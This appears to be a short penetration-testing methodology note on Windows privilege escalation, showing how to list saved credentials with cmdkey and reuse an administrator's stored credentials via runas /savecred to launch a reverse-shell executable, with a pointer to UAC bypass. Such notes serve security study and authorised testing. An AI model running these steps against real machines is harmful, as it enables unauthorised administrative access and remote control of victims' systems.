List any saved credentials:
```
cmdkey /list
```

![unnamed_b3bb3f76fce341f98937be94c6f0c590](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Password%20Attacks/Passwords%20-%20Saved%20Creds/{{notename}}-202605011742.png)

Run our shell with the admin account's saved credentials for spawning a new high privileged shell: (This attack is not always stable.)
runas /savecred /user:admin C:\Users\user\reverse.exe

Whenever you get a shell as a user who's a part of the administrators group, this is where UAC bypass usually comes in handy.